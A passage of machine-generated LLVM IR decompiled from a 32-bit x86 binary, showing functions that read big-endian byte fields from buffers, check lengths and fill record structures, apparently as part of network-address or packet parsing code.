  %v2_80516fc = inttoptr i32 %v1_80516fc to i8*
  %v3_80516fc = load i8, i8* %v2_80516fc, align 1
  %v4_80516fc = zext i8 %v3_80516fc to i32
  %v1_8051700 = add i32 %v0_80516fc, 9
  %v2_8051700 = inttoptr i32 %v1_8051700 to i8*
  %v3_8051700 = load i8, i8* %v2_8051700, align 1
  %v4_8051700 = zext i8 %v3_8051700 to i32
  %v2_8051704 = mul nuw nsw i32 %v4_80516fc, 256
  %v2_8051707 = or i32 %v4_8051700, %v2_8051704
  %v1_8051709 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051709 = add i32 %v1_8051709, 40
  %v3_8051709 = inttoptr i32 %v2_8051709 to i32*
  store i32 %v2_8051707, i32* %v3_8051709, align 4
  %v0_805170c = load i32, i32* @ecx, align 4
  %v1_805170c = add i32 %v0_805170c, 10
  %v2_805170c = inttoptr i32 %v1_805170c to i8*
  %v3_805170c = load i8, i8* %v2_805170c, align 1
  %v4_805170c = zext i8 %v3_805170c to i32
  %v1_8051710 = add i32 %v0_805170c, 11
  %v2_8051710 = inttoptr i32 %v1_8051710 to i8*
  %v3_8051710 = load i8, i8* %v2_8051710, align 1
  %v4_8051710 = zext i8 %v3_8051710 to i32
  %v2_8051714 = mul nuw nsw i32 %v4_805170c, 256
  %v2_8051717 = or i32 %v4_8051710, %v2_8051714
  %v1_8051719 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051719 = add i32 %v1_8051719, 44
  %v3_8051719 = inttoptr i32 %v2_8051719 to i32*
  store i32 %v2_8051717, i32* %v3_8051719, align 4
  %v2_8051721 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051721, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 6, 7, 2, 3, 5, 8, 4, 1, 9, 10, 0 }
  uselistorder i32 40, { 4, 5, 10, 6, 7, 8, 9, 1, 3, 11, 12, 13, 14, 2, 0 }
  uselistorder i32 7, { 7, 8, 1, 3, 5, 2, 0, 6, 10, 11, 12, 13, 9, 4 }
  uselistorder i32 6, { 14, 15, 2, 3, 17, 18, 0, 6, 10, 8, 9, 7, 16, 19, 20, 4, 1, 5, 11, 12, 13 }
  uselistorder i32 28, { 10, 11, 8, 9, 24, 28, 37, 19, 12, 13, 2, 14, 15, 16, 17, 18, 3, 4, 5, 0, 29, 7, 20, 25, 26, 21, 22, 30, 31, 32, 33, 34, 35, 1, 36, 38, 27, 6, 23 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 18, 5, 13, 19, 14, 6, 15, 7, 8, 9, 10, 16, 17, 11, 12 }
  uselistorder i8 4, { 0, 2, 1, 3, 4 }
  uselistorder i8 8, { 0, 2, 4, 3, 5, 1, 6, 7 }
}

define i32 @function_8051724() local_unnamed_addr {
dec_label_pc_8051724:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8051724 = load i32, i32* @edi, align 4
  %v0_8051725 = load i32, i32* @esi, align 4
  %v0_8051726 = load i32, i32* @ebx, align 4
  store i32 %v0_8051726, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8051733 = load i32, i32* @eax, align 4
  %v1_8051736 = inttoptr i32 %tmp3 to i32*
  %v2_8051736 = load i32, i32* %v1_8051736, align 4
  %v7_8051738 = inttoptr i32 %v2_8051736 to i8*
  %v8_8051738 = call i32 @function_8051c74(i8* %v7_8051738, i32 %tmp2, i32 %tmp, i32 %v0_8051733, i32 %v0_8051726, i32 %v0_8051725, i32 %v0_8051724)
  store i32 %v8_8051738, i32* @ecx, align 4
  %v2_8051742 = icmp slt i32 %v8_8051738, 0
  br i1 %v2_8051742, label %dec_label_pc_8051771, label %dec_label_pc_8051746

dec_label_pc_8051746:                             ; preds = %dec_label_pc_8051724
  %v0_8051746 = load i32, i32* @ebx, align 4
  %v2_8051746 = sub i32 %v0_8051746, %v8_8051738
  %v1_8051748 = add i32 %v2_8051746, -3
  %v6_8051748 = sub i32 2, %v2_8051746
  %v7_8051748 = and i32 %v6_8051748, %v2_8051746
  %v8_8051748 = icmp slt i32 %v7_8051748, 0
  %v9_8051748 = icmp eq i32 %v1_8051748, 0
  %v10_8051748 = icmp slt i32 %v1_8051748, 0
  %v3_805174b = icmp eq i1 %v10_8051748, %v8_8051748
  %v4_805174b = icmp eq i1 %v9_8051748, false
  %v5_805174b = and i1 %v4_805174b, %v3_805174b
  br i1 %v5_805174b, label %dec_label_pc_8051752, label %dec_label_pc_805174d

dec_label_pc_805174d:                             ; preds = %dec_label_pc_8051746
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8051771

dec_label_pc_8051752:                             ; preds = %dec_label_pc_8051746
  %v0_8051752 = load i32, i32* @edi, align 4
  %v2_8051752 = add i32 %v0_8051752, %v8_8051738
  store i32 %v2_8051752, i32* @edx, align 4
  %v1_8051755 = add i32 %v8_8051738, 4
  store i32 %v1_8051755, i32* @ecx, align 4
  %v0_8051758 = load i32, i32* @esi, align 4
  %v1_8051758 = add i32 %v0_8051758, 5
  %v2_8051758 = inttoptr i32 %v1_8051758 to i8*
  %v3_8051758 = load i8, i8* %v2_8051758, align 1
  %v3_805175c = inttoptr i32 %v2_8051752 to i8*
  store i8 %v3_8051758, i8* %v3_805175c, align 1
  %v0_805175e = load i32, i32* @esi, align 4
  %v1_805175e = add i32 %v0_805175e, 4
  %v2_805175e = inttoptr i32 %v1_805175e to i32*
  %v3_805175e = load i32, i32* %v2_805175e, align 4
  %v1_8051761 = trunc i32 %v3_805175e to i8
  %v2_8051761 = load i32, i32* @edx, align 4
  %v3_8051761 = add i32 %v2_8051761, 1
  %v4_8051761 = inttoptr i32 %v3_8051761 to i8*
  store i8 %v1_8051761, i8* %v4_8051761, align 1
  %v0_8051764 = load i32, i32* @esi, align 4
  %v1_8051764 = add i32 %v0_8051764, 9
  %v2_8051764 = inttoptr i32 %v1_8051764 to i8*
  %v3_8051764 = load i8, i8* %v2_8051764, align 1
  %v2_8051768 = load i32, i32* @edx, align 4
  %v3_8051768 = add i32 %v2_8051768, 2
  %v4_8051768 = inttoptr i32 %v3_8051768 to i8*
  store i8 %v3_8051764, i8* %v4_8051768, align 1
  %v0_805176b = load i32, i32* @esi, align 4
  %v1_805176b = add i32 %v0_805176b, 8
  %v2_805176b = inttoptr i32 %v1_805176b to i32*
  %v3_805176b = load i32, i32* %v2_805176b, align 4
  %v1_805176e = trunc i32 %v3_805176b to i8
  %v2_805176e = load i32, i32* @edx, align 4
  %v3_805176e = add i32 %v2_805176e, 3
  %v4_805176e = inttoptr i32 %v3_805176e to i8*
  store i8 %v1_805176e, i8* %v4_805176e, align 1
  %v0_8051771.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051771

dec_label_pc_8051771:                             ; preds = %dec_label_pc_8051724, %dec_label_pc_805174d, %dec_label_pc_8051752
  %v0_8051771 = phi i32 [ %v8_8051738, %dec_label_pc_8051724 ], [ -1, %dec_label_pc_805174d ], [ %v0_8051771.pre, %dec_label_pc_8051752 ]
  %v2_8051773 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051773, i32* @ebx, align 4
  store i32 %v0_8051724, i32* @edi, align 4
  ret i32 %v0_8051771

; uselistorder directives
  uselistorder i32 %v1_8051748, { 1, 0 }
  uselistorder i32 %v2_8051746, { 0, 2, 1 }
  uselistorder i32 %v8_8051738, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 4, 0 }
  uselistorder label %dec_label_pc_8051771, { 2, 1, 0 }
}

define i32 @function_8051778() local_unnamed_addr {
dec_label_pc_8051778:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8051783 = call i32 @function_8051ddc(i32 %tmp, i32 %tmp2)
  %v2_805178b = icmp slt i32 %v2_8051783, 0
  br i1 %v2_805178b, label %dec_label_pc_8051792, label %dec_label_pc_805178f

dec_label_pc_805178f:                             ; preds = %dec_label_pc_8051778
  %v1_805178f = add i32 %v2_8051783, 4
  br label %dec_label_pc_8051792

dec_label_pc_8051792:                             ; preds = %dec_label_pc_8051778, %dec_label_pc_805178f
  %v0_8051795 = phi i32 [ %v2_8051783, %dec_label_pc_8051778 ], [ %v1_805178f, %dec_label_pc_805178f ]
  ret i32 %v0_8051795

; uselistorder directives
  uselistorder label %dec_label_pc_8051792, { 1, 0 }
}

define i32 @function_8051798() local_unnamed_addr {
dec_label_pc_8051798:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051798 = load i32, i32* @ebp, align 4
  %v0_8051799 = load i32, i32* @edi, align 4
  %v0_805179a = load i32, i32* @esi, align 4
  %v0_805179b = load i32, i32* @ebx, align 4
  store i32 %v0_805179b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80517bc = ptrtoint i32* %stack_var_-272 to i32
  %v4_80517c9 = call i32 @function_8051d04(i32 %tmp4, i32 %tmp7, i32 %v2_80517bc, i32 256)
  store i32 %v4_80517c9, i32* @edi, align 4
  %v3_80517d3 = icmp slt i32 %v4_80517c9, 0
  br i1 %v3_80517d3, label %dec_label_pc_8051884, label %dec_label_pc_80517db

dec_label_pc_80517db:                             ; preds = %dec_label_pc_8051798
  %v0_80517db = load i32, i32* @ebx, align 4
  %v3_80517db = add i32 %v0_80517db, %v4_80517c9
  %v0_80517dd = load i32, i32* @esi, align 4
  %v2_80517dd = sub i32 %v0_80517dd, %v3_80517db
  %v1_80517e3 = add i32 %v2_80517dd, -10
  %v10_80517e3 = icmp slt i32 %v1_80517e3, 0
  store i32 %v1_80517e3, i32* @esi, align 4
  %v1_80517ea = icmp eq i1 %v10_80517e3, false
  br i1 %v1_80517ea, label %dec_label_pc_80517f3, label %dec_label_pc_80517ec

dec_label_pc_80517ec:                             ; preds = %dec_label_pc_80517db
  br label %dec_label_pc_8051884

dec_label_pc_80517f3:                             ; preds = %dec_label_pc_80517db
  %v6_80517fa = add i32 %v3_80517db, %tmp4
  store i32 %v6_80517fa, i32* @ebx, align 4
  %v1_8051806 = call i32 @function_804d014(i32 %v2_80517bc)
  %v1_805180b = load i32, i32* @ebp, align 4
  %v2_805180b = inttoptr i32 %v1_805180b to i32*
  store i32 %v1_8051806, i32* %v2_805180b, align 4
  %v0_805180e = load i32, i32* @ebx, align 4
  %v1_805180e = add i32 %v0_805180e, 4
  store i32 %v1_805180e, i32* %esi.global-to-local, align 4
  %v1_8051811 = inttoptr i32 %v0_805180e to i8*
  %v2_8051811 = load i8, i8* %v1_8051811, align 1
  %v3_8051811 = zext i8 %v2_8051811 to i32
  %v1_8051814 = add i32 %v0_805180e, 1
  %v2_8051814 = inttoptr i32 %v1_8051814 to i8*
  %v3_8051814 = load i8, i8* %v2_8051814, align 1
  %v4_8051814 = zext i8 %v3_8051814 to i32
  %v2_8051818 = mul nuw nsw i32 %v3_8051811, 256
  %v2_805181b = or i32 %v4_8051814, %v2_8051818
  %v1_805181d = load i32, i32* @ebp, align 4
  %v2_805181d = add i32 %v1_805181d, 4
  %v3_805181d = inttoptr i32 %v2_805181d to i32*
  store i32 %v2_805181b, i32* %v3_805181d, align 4
  %v0_8051820 = load i32, i32* @ebx, align 4
  %v1_8051820 = add i32 %v0_8051820, 2
  %v2_8051820 = inttoptr i32 %v1_8051820 to i8*
  %v3_8051820 = load i8, i8* %v2_8051820, align 1
  %v4_8051820 = zext i8 %v3_8051820 to i32
  %v1_8051824 = add i32 %v0_8051820, 3
  %v2_8051824 = inttoptr i32 %v1_8051824 to i8*
  %v3_8051824 = load i8, i8* %v2_8051824, align 1
  %v4_8051824 = zext i8 %v3_8051824 to i32
  %v2_8051828 = mul nuw nsw i32 %v4_8051820, 256
  %v2_805182b = or i32 %v4_8051824, %v2_8051828
  %v1_805182d = load i32, i32* @ebp, align 4
  %v2_805182d = add i32 %v1_805182d, 8
  %v3_805182d = inttoptr i32 %v2_805182d to i32*
  store i32 %v2_805182b, i32* %v3_805182d, align 4
  %v0_8051830 = load i32, i32* @ebx, align 4
  %v1_8051830 = add i32 %v0_8051830, 4
  %v2_8051830 = inttoptr i32 %v1_8051830 to i8*
  %v3_8051830 = load i8, i8* %v2_8051830, align 1
  %v4_8051830 = zext i8 %v3_8051830 to i32
  %v0_8051834 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051834 = add i32 %v0_8051834, 1
  %v2_8051834 = inttoptr i32 %v1_8051834 to i8*
  %v3_8051834 = load i8, i8* %v2_8051834, align 1
  %v4_8051834 = zext i8 %v3_8051834 to i32
  %v2_8051838 = mul nuw i32 %v4_8051830, 16777216
  %v2_805183b = mul nuw nsw i32 %v4_8051834, 65536
  %v1_805183e = add i32 %v0_8051834, 2
  %v2_805183e = inttoptr i32 %v1_805183e to i8*
  %v3_805183e = load i8, i8* %v2_805183e, align 1
  %v4_805183e = zext i8 %v3_805183e to i32
  %v2_8051842 = mul nuw nsw i32 %v4_805183e, 256
  %v2_8051845 = or i32 %v2_805183b, %v2_8051838
  %v1_8051847 = add i32 %v0_8051834, 3
  %v2_8051847 = inttoptr i32 %v1_8051847 to i8*
  %v3_8051847 = load i8, i8* %v2_8051847, align 1
  %v4_8051847 = zext i8 %v3_8051847 to i32
  %v2_805184b = or i32 %v4_8051847, %v2_8051845
  %v2_805184d = or i32 %v2_805184b, %v2_8051842
  store i32 %v2_805184d, i32* @ecx, align 4
  %v1_805184f = load i32, i32* @ebp, align 4
  %v2_805184f = add i32 %v1_805184f, 12
  %v3_805184f = inttoptr i32 %v2_805184f to i32*
  store i32 %v2_805184d, i32* %v3_805184f, align 4
  %v0_8051852 = load i32, i32* @ebx, align 4
  %v1_8051852 = add i32 %v0_8051852, 8
  %v2_8051852 = inttoptr i32 %v1_8051852 to i8*
  %v3_8051852 = load i8, i8* %v2_8051852, align 1
  %v4_8051852 = zext i8 %v3_8051852 to i32
  %v1_8051856 = add i32 %v0_8051852, 9
  %v2_8051856 = inttoptr i32 %v1_8051856 to i8*
  %v3_8051856 = load i8, i8* %v2_8051856, align 1
  %v4_8051856 = zext i8 %v3_8051856 to i32
  %v2_805185a = mul nuw nsw i32 %v4_8051852, 256
  %v1_805185d = add i32 %v0_8051852, 10
  %v2_8051860 = or i32 %v4_8051856, %v2_805185a
  store i32 %v2_8051860, i32* @edx, align 4
  %v1_8051862 = load i32, i32* @ebp, align 4
  %v2_8051862 = add i32 %v1_8051862, 20
  %v3_8051862 = inttoptr i32 %v2_8051862 to i32*
  store i32 %v1_805185d, i32* %v3_8051862, align 4
  %v0_8051865 = load i32, i32* @edx, align 4
  %v1_8051865 = load i32, i32* @ebp, align 4
  %v2_8051865 = add i32 %v1_8051865, 16
  %v3_8051865 = inttoptr i32 %v2_8051865 to i32*
  store i32 %v0_8051865, i32* %v3_8051865, align 4
  %v1_805186f = add i32 %v3_80517db, 10
  %v1_8051872 = load i32, i32* @ebp, align 4
  %v2_8051872 = add i32 %v1_8051872, 24
  %v3_8051872 = inttoptr i32 %v2_8051872 to i32*
  store i32 %v1_805186f, i32* %v3_8051872, align 4
  %v4_8051875 = load i32, i32* @edx, align 4
  %v5_8051879 = icmp slt i32 %v1_80517e3, %v4_8051875
  br i1 %v5_8051879, label %dec_label_pc_805187b, label %dec_label_pc_8051880

dec_label_pc_805187b:                             ; preds = %dec_label_pc_80517f3
  br label %dec_label_pc_8051884

dec_label_pc_8051880:                             ; preds = %dec_label_pc_80517f3
  %v1_8051880 = load i32, i32* @edi, align 4
  %v2_8051880 = add i32 %v4_8051875, 10
  %v3_8051880 = add i32 %v2_8051880, %v1_8051880
  br label %dec_label_pc_8051884

dec_label_pc_8051884:                             ; preds = %dec_label_pc_8051798, %dec_label_pc_805187b, %dec_label_pc_80517ec, %dec_label_pc_8051880
  %v0_805188a = phi i32 [ %v4_80517c9, %dec_label_pc_8051798 ], [ -1, %dec_label_pc_805187b ], [ %v1_80517e3, %dec_label_pc_80517ec ], [ %v3_8051880, %dec_label_pc_8051880 ]
  %v2_805188c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805188c, i32* @ebx, align 4
  store i32 %v0_805179a, i32* @esi, align 4
  store i32 %v0_8051799, i32* @edi, align 4
  store i32 %v0_8051798, i32* @ebp, align 4
  ret i32 %v0_805188a

; uselistorder directives
  uselistorder i32 %v1_80517e3, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80517db, { 1, 0, 2 }
  uselistorder i32 %v4_80517c9, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80517bc, { 1, 0 }
  uselistorder i32 24, { 5, 6, 13, 0, 7, 8, 9, 14, 2, 3, 12, 4, 10, 15, 16, 17, 18, 19, 20, 21, 22, 1, 11 }
  uselistorder i32 20, { 17, 18, 19, 22, 4, 26, 20, 7, 21, 23, 24, 5, 27, 28, 2, 9, 10, 12, 11, 29, 30, 31, 0, 32, 1, 33, 8, 34, 35, 36, 25, 13, 14, 6, 15, 16, 3 }
  uselistorder i32 9, { 7, 8, 9, 10, 1, 11, 2, 12, 13, 0, 3, 14, 15, 16, 17, 4, 5, 6 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 13, 11, 14, 12, 16, 15, 17, 19, 18 }
  uselistorder i32 3, { 33, 34, 35, 36, 37, 38, 20, 4, 21, 16, 41, 7, 39, 22, 9, 8, 5, 1, 2, 0, 23, 6, 24, 31, 17, 25, 10, 32, 26, 40, 18, 19, 27, 11, 15, 13, 14, 12, 3, 28, 29, 30 }
  uselistorder i32 (i32)* @function_804d014, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_8051884, { 3, 1, 2, 0 }
}

define i32 @function_8051894() local_unnamed_addr {
dec_label_pc_8051894:
  %v3_80518a1 = call i32 @function_804b5d0(i32 ptrtoint ([11 x i8]* @global_var_8054625.211 to i32), i32 ptrtoint (i32* @global_var_80545f0.199 to i32))
  store i32 %v3_80518a1, i32* @eax, align 4
  %v1_80518a9 = icmp eq i32 %v3_80518a1, 0
  %v1_80518ab = icmp eq i1 %v1_80518a9, false
  br i1 %v1_80518ab, label %dec_label_pc_80518c1, label %dec_label_pc_80518ad

dec_label_pc_80518ad:                             ; preds = %dec_label_pc_8051894
  %v3_80518b9 = call i32 @function_804b5d0(i32 ptrtoint ([18 x i8]* @global_var_8054630.212 to i32), i32 ptrtoint (i32* @global_var_80545f0.199 to i32))
  br label %dec_label_pc_80518c1

dec_label_pc_80518c1:                             ; preds = %dec_label_pc_8051894, %dec_label_pc_80518ad
  %v0_80518c4 = phi i32 [ %v3_80518a1, %dec_label_pc_8051894 ], [ %v3_80518b9, %dec_label_pc_80518ad ]
  ret i32 %v0_80518c4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804b5d0, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80545f0.199 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80518c1, { 1, 0 }
}

define i32 @function_80518c5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_80518c5:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80518c5 = load i32, i32* @ebp, align 4
  %v0_80518c6 = load i32, i32* @edi, align 4
  %v0_80518c7 = load i32, i32* @esi, align 4
  %v0_80518c8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80518d6 = sub i32 0, %arg6
  %v1_80518d8 = urem i32 %v1_80518d6, 4
  %v2_80518d8 = icmp eq i32 %v1_80518d8, 0
  store i32 %v1_80518d8, i32* %eax.global-to-local, align 4
  br i1 %v2_80518d8, label %dec_label_pc_80518e9, label %dec_label_pc_80518dd

dec_label_pc_80518dd:                             ; preds = %dec_label_pc_80518c5
  %v2_80518dd = sub i32 %arg7, %v1_80518d8
  %v7_80518dd = icmp ugt i32 %v1_80518d8, %arg7
  br i1 %v7_80518dd, label %dec_label_pc_8051b8d, label %dec_label_pc_80518e5

dec_label_pc_80518e5:                             ; preds = %dec_label_pc_80518dd
  %v2_80518e5 = add i32 %v1_80518d8, %arg6
  store i32 %v2_80518e5, i32* @ebx, align 4
  store i32 %v2_80518dd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80518e9

dec_label_pc_80518e9:                             ; preds = %dec_label_pc_80518c5, %dec_label_pc_80518e5
  %v0_80518f2 = phi i32 [ %arg6, %dec_label_pc_80518c5 ], [ %v2_80518e5, %dec_label_pc_80518e5 ]
  %v0_80518f5 = phi i32 [ %arg7, %dec_label_pc_80518c5 ], [ %v2_80518dd, %dec_label_pc_80518e5 ]
  %tmp149 = icmp ult i32 %v0_80518f5, 32
  br i1 %tmp149, label %dec_label_pc_8051b8d, label %dec_label_pc_80518f2

dec_label_pc_80518f2:                             ; preds = %dec_label_pc_80518e9
  %v1_80518f2 = add i32 %v0_80518f2, 32
  store i32 %v1_80518f2, i32* %eax.global-to-local, align 4
  %v1_80518f5 = add i32 %v0_80518f5, -32
  store i32 %v1_80518f5, i32* @ebp, align 4
  %v5_80518f8 = inttoptr i32 %v1_80518f2 to i8*
  %v12_80518fc = icmp eq i32 %arg4, 1
  br i1 %v12_80518fc, label %dec_label_pc_8051a1e, label %dec_label_pc_8051907

dec_label_pc_8051907:                             ; preds = %dec_label_pc_80518f2
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_805190e = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_805190e, align 4
  %tmp150 = icmp ult i32 %v1_80518f5, 4
  br i1 %tmp150, label %dec_label_pc_8051b8d, label %dec_label_pc_805191a

dec_label_pc_805191a:                             ; preds = %dec_label_pc_8051907
  %v0_805191a = load i32, i32* %edx.global-to-local, align 4
  %v1_805191a = add i32 %v0_805191a, -36
  store i32 %v1_805191a, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_805191a, 8
  br i1 %tmp151, label %dec_label_pc_8051b8d, label %dec_label_pc_8051926

dec_label_pc_8051926:                             ; preds = %dec_label_pc_805191a
  %v0_8051926 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8051926, 16
  br i1 %tmp152, label %dec_label_pc_8051b8d, label %dec_label_pc_805192f

dec_label_pc_805192f:                             ; preds = %dec_label_pc_8051926
  %v1_805192f = add i32 %v0_805191a, -48
  store i32 %v1_805192f, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_805192f, 8
  br i1 %tmp153, label %dec_label_pc_8051b8d, label %dec_label_pc_805193b

dec_label_pc_805193b:                             ; preds = %dec_label_pc_805192f
  %v0_805193b = load i32, i32* @ebx, align 4
  %v1_805193b = add i32 %v0_805193b, 48
  %v1_805193e = add i32 %v0_805191a, -44
  store i32 %v1_805193e, i32* @ebp, align 4
  %v1_8051945 = add i32 %v0_805191a, -56
  store i32 %v1_8051945, i32* @eax, align 4
  %v1_8051948 = add i32 %v0_805193b, 36
  store i32 %v1_8051948, i32* @edi, align 4
  %v7_805194b = icmp ult i32 %v1_8051945, %v1_805193e
  br i1 %v7_805194b, label %dec_label_pc_8051954, label %dec_label_pc_805194f

dec_label_pc_805194f:                             ; preds = %dec_label_pc_805193b
  %v1_805194f = add i32 %v0_805193b, 44
  store i32 %v1_805194f, i32* @esi, align 4
  br label %dec_label_pc_8051959

dec_label_pc_8051954:                             ; preds = %dec_label_pc_805193b
  %v1_8051954 = add i32 %v0_805193b, 56
  store i32 %v1_8051954, i32* @esi, align 4
  store i32 %v1_8051945, i32* @ebp, align 4
  br label %dec_label_pc_8051959

dec_label_pc_8051959:                             ; preds = %dec_label_pc_805194f, %dec_label_pc_8051954
  %v0_8051959 = phi i32 [ %v1_805193e, %dec_label_pc_805194f ], [ %v1_8051945, %dec_label_pc_8051954 ]
  %tmp154 = icmp ult i32 %v0_8051959, 80
  br i1 %tmp154, label %dec_label_pc_8051b8d, label %dec_label_pc_8051962

dec_label_pc_8051962:                             ; preds = %dec_label_pc_8051959
  %v0_8051962 = call i32 @function_8051894()
  store i32 %v0_8051962, i32* %eax.global-to-local, align 4
  %v1_805196b = icmp eq i32 %v0_8051962, 0
  br i1 %v1_805196b, label %dec_label_pc_805198f, label %dec_label_pc_805196f

dec_label_pc_805196f:                             ; preds = %dec_label_pc_8051962
  store i32 %v1_80518f2, i32* %edx.global-to-local, align 4
  store i32 %v1_805193b, i32* %eax.global-to-local, align 4
  store i8* %v5_80518f8, i8** %stack_var_-44, align 4
  %v0_805197a = load i32, i32* @edi, align 4
  %v0_8051986 = load i32, i32* @esi, align 4
  %v5_8051986 = inttoptr i32 %v0_8051986 to i8*
  br label %dec_label_pc_8051a3d

dec_label_pc_805198f:                             ; preds = %dec_label_pc_8051962
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8051993 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8051993, align 4
  %v1_8051999 = call i32 @function_804b4bc(i32 0)
  store i32 %v1_8051999, i32* %eax.global-to-local, align 4
  %v1_805199e = inttoptr i32 %v1_8051999 to i32*
  %v2_805199e = load i32, i32* %v1_805199e, align 4
  store i32 %v2_805199e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b8d

dec_label_pc_80519a9:                             ; preds = %dec_label_pc_8051b10
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80519ad = load i8*, i8** %stack_var_-44, align 4
  %v3_80519ad = ptrtoint i8* %v2_80519ad to i32
  %v2_80519b0 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80519ad, i32* %v2_80519b0, align 4
  %v0_80519b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519b2 = add i32 %v0_80519b2, 4
  %v2_80519b2 = inttoptr i32 %v1_80519b2 to i32*
  store i32 0, i32* %v2_80519b2, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80519bd = load i32, i32* @ebx, align 4
  %v1_80519bd = add i32 %v0_80519bd, 4
  %v2_80519bd = inttoptr i32 %v1_80519bd to i32*
  %v3_80519bd = load i32, i32* %v2_80519bd, align 4
  store i32 %v3_80519bd, i32* %eax.global-to-local, align 4
  store i32 %v3_80519bd, i32* %arg5, align 4
  %v0_80519c2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519c2 = add i32 %v0_80519c2, 8
  %v2_80519c2 = inttoptr i32 %v1_80519c2 to i32*
  store i32 2, i32* %v2_80519c2, align 4
  %v0_80519c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519c9 = add i32 %v0_80519c9, 12
  %v2_80519c9 = inttoptr i32 %v1_80519c9 to i32*
  store i32 4, i32* %v2_80519c9, align 4
  br label %dec_label_pc_8051a02

dec_label_pc_80519d6:                             ; preds = %dec_label_pc_8051b32
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_80519de = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80519de, align 4
  %v0_80519e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519e0 = add i32 %v0_80519e0, 4
  %v2_80519e0 = inttoptr i32 %v1_80519e0 to i32*
  store i32 0, i32* %v2_80519e0, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80519eb = load i32, i32* @ebx, align 4
  %v1_80519eb = add i32 %v0_80519eb, 4
  %v2_80519eb = inttoptr i32 %v1_80519eb to i32*
  %v3_80519eb = load i32, i32* %v2_80519eb, align 4
  store i32 %v3_80519eb, i32* %eax.global-to-local, align 4
  store i32 %v3_80519eb, i32* %arg5, align 4
  %v0_80519f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519f0 = add i32 %v0_80519f0, 8
  %v2_80519f0 = inttoptr i32 %v1_80519f0 to i32*
  store i32 10, i32* %v2_80519f0, align 4
  %v0_80519f7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519f7 = add i32 %v0_80519f7, 12
  %v2_80519f7 = inttoptr i32 %v1_80519f7 to i32*
  store i32 16, i32* %v2_80519f7, align 4
  br label %dec_label_pc_8051a02

dec_label_pc_8051a02:                             ; preds = %dec_label_pc_80519a9, %dec_label_pc_80519d6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80519a9 ], [ %stack_var_-32.0, %dec_label_pc_80519d6 ]
  %v1_8051a02 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051a02 = add i32 %v1_8051a02, 16
  %v3_8051a02 = inttoptr i32 %v2_8051a02 to i32*
  store i32 %storemerge, i32* %v3_8051a02, align 4
  %v0_8051a05 = load i32, i32* @ebx, align 4
  %v1_8051a05 = add i32 %v0_8051a05, 8
  %v1_8051a08 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051a08 = add i32 %v1_8051a08, 4
  %v3_8051a08 = inttoptr i32 %v2_8051a08 to i32*
  store i32 %v1_8051a05, i32* %v3_8051a08, align 4
